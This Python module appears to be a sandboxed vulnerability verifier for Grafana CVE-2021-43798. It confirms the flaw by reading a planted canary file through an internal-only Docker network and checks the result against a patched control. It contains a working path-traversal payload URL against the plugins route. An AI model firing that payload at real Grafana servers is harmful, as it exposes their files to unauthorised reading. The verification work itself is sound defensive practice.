"""Independent lab-only canary verifier over *container-internal* Docker DNS.
Never uses docker port, published host ports, or external destinations.
"""
from __future__ import annotations
import json, os, secrets, tempfile, time, uuid
from pathlib import Path
from .core import TaskError,Executor,json_write,sha256_file
from .archive import inventory
from .platform_export import save_identity_check

CURL_IMAGE='curlimages/curl:8.12.1'
BUILTIN_AUDITED={'CVE-2021-43798':{'target_version':'8.2.6','fixed_version':'8.2.7',
                                    'fixed_image':'grafana/grafana:8.2.7','port':3000}}


def canonical_image_ref(ref):
    """Normalize only an implicit :latest tag; never equate different digests.

    Compose can put ``project-service`` in Config.Image while ``docker save``
    writes ``project-service:latest`` in manifest.json/RepoTags.
    """
    if not isinstance(ref, str) or not ref:
        raise TaskError('BAD_IMAGE_REFERENCE', repr(ref))
    if ref.startswith('sha256:') or '@' in ref:
        return ref
    if ':' not in ref.rsplit('/', 1)[-1]:
        return ref + ':latest'
    return ref


def assert_archive_tag(artifact, image, runner, *, allow_load=False):
    original=inventory(artifact)
    if original['status']!='STRUCTURE_COMPLETE_NOT_RUNTIME_PROOF':
        raise TaskError('INVALID_ARTIFACT',original['status'])
    configs={x['config'] for x in original['images']
             if canonical_image_ref(image) in {canonical_image_ref(tag) for tag in (x.get('tags') or [])}}
    if not configs: raise TaskError('IMAGE_NOT_IN_ARTIFACT',f'{image} not found in saved artifact')
    inspect=runner.run(['docker','image','inspect',image],timeout=25,check=False)
    if inspect.returncode!=0:
        if not allow_load: raise TaskError('LOCAL_IMAGE_MISSING','Use --allow-load to load artifact')
        runner.run(['docker','load','-i',str(artifact)],timeout=180)
    with tempfile.TemporaryDirectory(prefix='track3-confirm-') as d:
        new=Path(d)/'current.tar'
        save_identity_check(runner, artifact, image, new)
        actual=inventory(new)
        actual_configs={x['config'] for x in actual['images']}
        if not configs.issubset(actual_configs):
            raise TaskError('IMAGE_CONTENT_MISMATCH','Image tag does not match archive config')
    return {'status':'ARCHIVE_TAG_CONFIG_MATCHED','configs':sorted(configs),
            'artifact_sha256':original['sha256']}

def _curl(runner,network,hostname,path,*,timeout=25):
    url=f'http://{hostname}:3000'+path
    p=runner.run(['docker','run','--rm','--network',network,'--cap-drop','ALL',
                   '--security-opt','no-new-privileges','--memory','128m',
                   '--entrypoint','curl',CURL_IMAGE,
                   '--noproxy','*','--path-as-is','--silent','--show-error',
                   '--connect-timeout','5','--max-time','15',
                   '--write-out','\n__T3HTTP__:%{http_code}',url],timeout=timeout)
    if '\n__T3HTTP__:' not in p.stdout: raise TaskError('CURL_BAD_RESULT','No HTTP status marker')
    content,code=p.stdout.rsplit('\n__T3HTTP__:',1)
    try: n=int(code.strip())
    except ValueError as e: raise TaskError('CURL_BAD_STATUS',repr(code)) from e
    return {'http':n,'body':content[:4096]}

def probe_trial(runner,image,marker,name,*,expected_version):
    """Run real target and probe sidecar ONLY on internal network. Always clean up."""
    suffix=uuid.uuid4().hex[:10]
    network='t3proof-'+suffix
    cname='t3target-'+suffix
    created_network=False;started=False
    record={'image':image,'expected_version':expected_version,'network_isolation':'internal_only_sidecar',
            'container':cname}
    try:
        runner.run(['docker','network','create','--internal','--driver','bridge',network],timeout=25)
        created_network=True
        runner.run(['docker','run','-d','--name',cname,'--network',network,
                    '--network-alias','target','--cap-drop','ALL',
                    '--security-opt','no-new-privileges','--pids-limit','256',
                    '--memory','768m',image],timeout=40)
        started=True
        # Bounded warmup, no reliance on host-published ports.
        last=''
        for i in range(24):
            try:
                h=_curl(runner,network,'target','/api/health')
                if h['http']==200:
                    try:
                        version=json.loads(h['body']).get('version')
                    except ValueError: version=None
                    if version==expected_version:
                        record['health_version']=version;break
                    last=f'Expected version {expected_version}, got {version}'
            except TaskError as e: last=str(e)[:200]
            time.sleep(2)
        else: raise TaskError('TARGET_NOT_READY',last or 'Health/version check did not pass')
        # Marker stored inside the target container (never reads host files).
        # fixed shell syntax; path is constrained to generated hex characters.
        filename='t3_'+secrets.token_hex(12)+'.txt'
        marker_path='/tmp/'+filename
        runner.run(['docker','exec','--user','0',cname,'sh','-c',
           'umask 022; printf %s "$1" > "$2"; chmod 0644 "$2"',
           't3',marker,marker_path],timeout=20)
        attack='/public/plugins/alertlist/../../../../../../../../tmp/'+filename
        positive=_curl(runner,network,'target',attack)
        negative=_curl(runner,network,'target','/public/plugins/alertlist/')
        record.update({'positive_http':positive['http'],'negative_http':negative['http'],
                       'positive_exact':positive['body']==marker,
                       'negative_exact':negative['body']==marker,
                       'positive_body_sha256':__import__('hashlib').sha256(positive['body'].encode()).hexdigest(),
                       'negative_body_sha256':__import__('hashlib').sha256(negative['body'].encode()).hexdigest(),
                       'canary_path':marker_path})
        return record
    except TaskError as e:
        if started:
            try:
                p=runner.run(['docker','logs','--tail','50',cname],timeout=12,check=False)
                record['docker_log_tail']=(p.stdout+'\n'+p.stderr)[-2000:]
            except TaskError: pass
        record['error_code']=e.code;record['error']=str(e)
        return record
    finally:
        if started:
            try: runner.run(['docker','rm','-f',cname],timeout=20,check=False)
            except TaskError:pass
        if created_network:
            try: runner.run(['docker','network','rm',network],timeout=20,check=False)
            except TaskError:pass

def verify_known(cve,artifact,image,out,*,fixed_image=None,allow_pull=False,allow_load=False,runner=None):
    runner=runner or Executor();out=Path(out);out.mkdir(parents=True,exist_ok=True)
    data={'cve':cve,'artifact':str(artifact),'image':image,'status':'PROOF_FAILED',
          'vulnerability_verified':False,'checks':[]}
    try:
        if cve not in BUILTIN_AUDITED:
            raise TaskError('ORACLE_NOT_IMPLEMENTED','No independently audited oracle for this CVE')
        spec=BUILTIN_AUDITED[cve]
        fixed_image=fixed_image or spec['fixed_image']
        identity=assert_archive_tag(Path(artifact),image,runner,allow_load=allow_load)
        data['identity']=identity;data['checks'].append('FINAL_ARCHIVE_CONFIG_MATCHED')
        p=runner.run(['docker','image','inspect',CURL_IMAGE],timeout=20,check=False)
        if p.returncode!=0:
            if not allow_pull: raise TaskError('PROBE_IMAGE_MISSING',f'docker pull {CURL_IMAGE}')
            runner.run(['docker','pull',CURL_IMAGE],timeout=120)
        p=runner.run(['docker','image','inspect',fixed_image],timeout=20,check=False)
        if p.returncode!=0:
            if not allow_pull: raise TaskError('PATCHED_IMAGE_MISSING','Pass --allow-pull')
            runner.run(['docker','pull',fixed_image],timeout=180)
        # The patched control MUST be runnable; otherwise no behavioral proof.
        marker='T3_NON_SECRET_CANARY_'+secrets.token_hex(24)
        vulnerable=probe_trial(runner,image,marker,'vulnerable',expected_version=spec['target_version'])
        data['vulnerable_trial']={k:v for k,v in vulnerable.items() if k!='canary_path'}
        if vulnerable.get('error_code'):
            raise TaskError('VULNERABLE_TRIAL_ERROR',vulnerable.get('error','unknown'))
        fixed=probe_trial(runner,fixed_image,marker,'fixed',expected_version=spec['fixed_version'])
        data['fixed_trial']={k:v for k,v in fixed.items() if k!='canary_path'}
        if fixed.get('error_code'): raise TaskError('FIXED_TRIAL_ERROR',fixed.get('error','unknown'))
        ok=(vulnerable.get('positive_http')==200 and vulnerable.get('positive_exact')
           and not vulnerable.get('negative_exact') and not fixed.get('positive_exact')
           and not fixed.get('negative_exact'))
        data['checks']+=['VULNERABLE_VERSION_CONFIRMED','PATCHED_VERSION_CONFIRMED',
                         'CANARY_POSITIVE_AND_NEGATIVE_REQUESTS_COMPLETED']
        data['status']='BEHAVIOR_VERIFIED' if ok else 'NOT_REPRODUCED'
        data['vulnerability_verified']=bool(ok)
    except (TaskError,ValueError,KeyError) as e:
        data['error_code']=getattr(e,'code','INVALID_PROOF_DATA');data['error']=str(e)[:1200]
    finally:
        json_write(out/'known_proof.json',data)
    return data
